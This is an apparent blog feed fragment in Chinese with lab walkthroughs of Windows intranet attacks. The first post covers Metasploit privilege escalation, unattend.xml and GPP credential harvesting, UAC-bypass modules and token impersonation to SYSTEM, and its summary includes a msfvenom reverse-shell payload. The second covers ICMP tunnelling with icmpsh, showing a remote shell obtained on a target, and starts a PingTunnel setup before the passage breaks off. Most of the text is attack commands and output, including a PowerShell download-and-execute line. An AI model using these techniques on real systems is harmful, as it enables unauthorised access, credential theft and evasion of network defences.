title="02.msf利用"></a>02.msf利用</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/trusted_service_path </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/trusted_service_path):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/trusted_service_path) &gt; run</span><br><span class="line"></span><br><span class="line">[-] The Windows::WindowsServices mixin is deprecated, use Windows::Services instead</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Finding a vulnerable service...</span><br><span class="line">[-] Exploit failed: NameError undefined local variable or method `service_list&#x27; for #&lt;Msf::Modules::Exploit__Windows__Local__Trusted_service_path::Metasploit3:0x00007fca71a280d0&gt;</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">这里没有利用成功</span></span><br></pre></td></tr></table></figure><h3 id="4-自动安装配置文件"><a href="#4-自动安装配置文件" class="headerlink" title="4.自动安装配置文件"></a>4.自动安装配置文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /b /s c:\Unattend.xml    #搜索Unatted.xml文件</span><br></pre></td></tr></table></figure><p><code>msf查找</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/enum_unattend </span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/enum_unattend):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   GETALL   true             yes       Collect all unattend.xml that are found</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Reading C:\Windows\panther\unattend.xml</span><br><span class="line">[+] Raw version of C:\Windows\panther\unattend.xml saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_989482.txt</span><br><span class="line">Unattend Credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line"> Type   Domain  Username        Password  Groups</span><br><span class="line"> ----   ------  --------        --------  ------</span><br><span class="line"> auto           administration</span><br><span class="line"> local          administration</span><br><span class="line"></span><br><span class="line">[+] Unattend Credentials saved as: /root/.msf4/loot/20210729010204_default_192.168.1.5_windows.unattend_206680.txt</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/enum_unattend) &gt; </span><br></pre></td></tr></table></figure><h3 id="5-查看计划任务"><a href="#5-查看计划任务" class="headerlink" title="5.查看计划任务"></a>5.查看计划任务</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure><p><code>AccessChk使用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe /accepteula    #首次使用接受许可，默认弹框</span><br><span class="line">accesschk.exe -dqv &quot;C:\Windows&quot;    #查看目录权限配置</span><br><span class="line">accesschk.exe -uwdqsUsers&quot;AuthenticatedUsers&quot;c:\*.* #列出某个驱动器下所有权限配置有缺陷的文件</span><br></pre></td></tr></table></figure><h2 id="0x03-组策略首选项提权"><a href="#0x03-组策略首选项提权" class="headerlink" title="0x03.组策略首选项提权"></a>0x03.组策略首选项提权</h2><h3 id="1-获取组策略凭据-SYSVOL-GPP"><a href="#1-获取组策略凭据-SYSVOL-GPP" class="headerlink" title="1.获取组策略凭据(SYSVOL/GPP)"></a>1.获取组策略凭据(SYSVOL/GPP)</h3><h4 id="01-powershell获取cpassword"><a href="#01-powershell获取cpassword" class="headerlink" title="01.powershell获取cpassword"></a>01.powershell获取cpassword</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;.\Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msf获取"><a href="#02-msf获取" class="headerlink" title="02.msf获取"></a>02.msf获取</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use post/windows/gather/credentials/gpp </span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/credentials/gpp):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   ALL      true             no        Enumerate all domains on network.</span><br><span class="line">   DOMAINS                   no        Enumerate list of space separated domains DOMAINS=&quot;dom1 dom2&quot;.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">   STORE    true             no        Store the enumerated files in loot.</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Checking for group policy history objects...</span><br><span class="line">[-] Error accessing C:\ProgramData\Microsoft\Group Policy\History : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Checking for SYSVOL locally...</span><br><span class="line">[-] Error accessing C:\Windows\SYSVOL\sysvol : stdapi_fs_ls: Operation failed: The system cannot find the path specified.</span><br><span class="line">[*] Enumerating Domains on the Network...</span><br><span class="line">[*] Retrieved Domain(s) JIYE, WORKGROUP from network</span><br><span class="line">[*] Enumerating domain information from the local registry...</span><br><span class="line">[*] Retrieved Domain(s) JIYE from registry</span><br><span class="line">[*] Retrieved DC DC.JIYE.NET from registry</span><br><span class="line">[*] Enumerating DCs for JIYE on the network...</span><br><span class="line">[-] No Domain Controllers found for JIYE</span><br><span class="line">[*] Searching for Policy Share on DC.JIYE.NET...</span><br><span class="line">[-] Error accessing \\DC.JIYE.NET\SYSVOL : stdapi_fs_ls: Operation failed: The network path was not found.</span><br><span class="line">[*] Searching for Group Policy XML Files...</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/credentials/gpp) &gt; </span><br></pre></td></tr></table></figure><h2 id="0x04-UAC绕过提权-msf"><a href="#0x04-UAC绕过提权-msf" class="headerlink" title="0x04.UAC绕过提权(msf)"></a>0x04.UAC绕过提权(msf)</h2><blockquote><p>使用前提：</p><p>一是系统当前用户必须在管理员组中<br>二是用户账户控制程序UAC设置为默认，即 “仅在程序试图更改我的计算机时通知我”</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)</span><br><span class="line">1   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry</span><br><span class="line">2   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">3   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">4   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">5   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br><span class="line">6   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">7   exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">8   exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)</span><br><span class="line">9   exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)</span><br><span class="line">10  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)</span><br><span class="line">11  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">12  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x05-令牌盗取"><a href="#0x05-令牌盗取" class="headerlink" title="0x05.令牌盗取"></a>0x05.令牌盗取</h2><h3 id="1-msf盗取"><a href="#1-msf盗取" class="headerlink" title="1.msf盗取"></a>1.msf盗取</h3><blockquote><p>当获得meterpreter时可以使用</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: JIYE\Administrator</span><br><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">JIYE\Administrator</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">No tokens available</span><br><span class="line"></span><br><span class="line">meterpreter &gt; impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br><span class="line">[-] Warning: Not currently running as SYSTEM, not all tokens will be available</span><br><span class="line">             Call rev2self if primary process token is SYSTEM</span><br><span class="line">[+] Delegation token available</span><br><span class="line">[+] Successfully impersonated user NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-漏洞发现&quot;&gt;&lt;a href=&quot;#0x01-漏洞发现&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞发现&quot;&gt;&lt;/a&gt;0x01.漏洞发现&lt;/h2&gt;&lt;h3 id=&quot;1-WMIC发现安装补丁&quot;&gt;&lt;a href=&quot;#1-WMIC发现安装补丁&quot; class=&quot;headerlink&quot; title=&quot;1.WMIC发现安装补丁&quot;&gt;&lt;/a&gt;1.WMIC发现安装补丁&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-msf发现安装补丁&quot;&gt;&lt;a href=&quot;#2-msf发现安装补丁&quot; class=&quot;headerlink&quot; title=&quot;2.msf发现安装补丁&quot;&gt;&lt;/a&gt;2.msf发现安装补丁&lt;/h3&gt;&lt;p&gt;&lt;code&gt;首先使用msfvenom生成恶意程序&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6666 -f exe &amp;gt; shell.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透测试-隐藏通信隧道技术</title>
    <link href="https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/"/>
    <id>https://lunamoore.github.io/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</id>
    <published>2021-07-24T09:30:16.000Z</published>
    <updated>2021-07-24T09:55:56.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01.基础知识"></a>0x01.基础知识</h2><blockquote><p>完成内网信息搜集后，需要先判断流量是否出得去、进得来。隐藏通信隧道技术常用于在访问受限的网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输。</p></blockquote><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>​        在渗透场景中，各种安全设备会检查对外连接的情况，如果发现异常，就会对通信进行阻断。因此建立专门的隐蔽隧道就十分必要，这能绕过端口屏蔽。<br>常用的隧道如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网络层隧道：IPv6、ICMP、GRE</span><br><span class="line">传输层隧道：TCP、UDP、常规端口转发</span><br><span class="line">应用层隧道：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="2-判断内网的连通性"><a href="#2-判断内网的连通性" class="headerlink" title="2.判断内网的连通性"></a>2.判断内网的连通性</h3><p>​        判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、DNS、ICMP等）及端口通信的情况。常见的允许流量流出的端口有80、8080、443、53、110、123等，常用的内网的连通性判断方法如下：</p><p><code>ICMP协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure><p><code>TCP协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 10.1.1.5 3306</span><br></pre></td></tr></table></figure><p><code>DNS协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baiduc.om 8.8.8.8</span><br><span class="line">dig @8.8.8.8 www.baidu.com</span><br></pre></td></tr></table></figure><p><code>HTTP协议</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure><p>​        还有一种情况是流量不能直接流出，需要在内网中设置代理，判断方法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、查看网络连接，判断是否存在与其他机器的1080（不绝对）等端口的连接，可尝试运行ping -n 1 -a ip命令</span><br><span class="line">2、查看内网中是否有主机名类似于&quot;proxy&quot;的机器。</span><br><span class="line">3、查看IE浏览器的直接代理。</span><br><span class="line">4、根据pac（代理自动配置）文件的路径（远程、本地），将其下载并查看。</span><br><span class="line">5、执行如下命令，利用curl工具确认：</span><br><span class="line">    curl https://www.baidu.com            //不通</span><br><span class="line">    curl -x proxy-ip:port www.baidu.com        //通</span><br></pre></td></tr></table></figure><h2 id="0x02-网络层隧道技术"><a href="#0x02-网络层隧道技术" class="headerlink" title="0x02.网络层隧道技术"></a>0x02.网络层隧道技术</h2><h3 id="1-IPv6隧道"><a href="#1-IPv6隧道" class="headerlink" title="1.IPv6隧道"></a>1.IPv6隧道</h3><blockquote><p>IPv6隧道技术是指通过IPv4隧道传输IPv6数据报文的技术，也就是说，将IPv6报文整体封装在IPv4数据报文中，以便在IPv4隧道中传输。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为现阶段的部分安全设备无法识别IPv6的通信技术，而大多数操作系统支持IPv6，因此可以通过某些软件来配置允许进行IPv6通信以此来避开防火墙和入侵检测系统，而即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。</span><br><span class="line">支持IPv6隧道的工具有socat、6tunnel、nt6tunnel等。</span><br></pre></td></tr></table></figure><h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2.ICMP隧道"></a>2.ICMP隧道</h3><blockquote><p>在一般的通信协议里，如果两台设备要进行通信，首先肯定需要开放端口，而在ICMP下就不需要，在一些网络环境中如果使用各类上层隧道（HTTP、DNS、常规正反向端口转发等）进行的操作都失败后，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装在ICMP的ping数据包中，从而穿过防火墙。</p></blockquote><p><code>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等：</code></p><h4 id="01-icmpsh"><a href="#01-icmpsh" class="headerlink" title="01.icmpsh"></a>01.icmpsh</h4><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：python2 icmpsh_m.py &lt;本机IP&gt; &lt;目标IP&gt;</span><br><span class="line">靶机：icmpsh -t &lt;外连主机IP&gt; -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>首先需要安装impacket</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载地址：https://github.com/SecureAuthCorp/impacket</span><br><span class="line">cd impacket</span><br><span class="line">python2 -m pip install .</span><br></pre></td></tr></table></figure><p><code>先在kali上运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br></pre></td></tr></table></figure><p><code>在靶机上运行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh -t 192.168.1.8 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p><code>得到shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/Downloads/icmpsh# python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br><span class="line">Microsoft Windows [�汾 5.2.3790]</span><br><span class="line">(C) ��Ȩ���� 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">admin-ad4c9d4d8\administrator</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : local</span><br><span class="line">   IP Address. . . . . . . . . . . . : 10.1.1.4</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.1.1.1</span><br><span class="line"></span><br><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   IP Address. . . . . . . . . . . . : 192.168.1.6</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.1.1</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;</span><br></pre></td></tr></table></figure><p><code>抓包分析</code></p><blockquote><p>192.168.1.10向192.168.1.6发起请求whoami</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121825789.png" class><blockquote><p>192.168.1.6向192.168.1.10响应</p></blockquote><img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121936653.png" class><h4 id="02-PingTunnel"><a href="#02-PingTunnel" class="headerlink" title="02.PingTunnel"></a>02.PingTunnel</h4><p><code>安装依赖</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> cd libpcap-1.10.1</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd PingTunnel/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">遇到报错安装以下</span><br><span class="line">apt-get install flex byacc -y #我遇到的报错是缺这俩</span><br></pre></td></tr></table></figure><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">kali攻击机</span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ifconfig                                                                                                                                             71 ⨯</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:befd:d9fb:f05a:6005  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::20c:29ff:fe4f:2524  prefixlen 64  scopeid 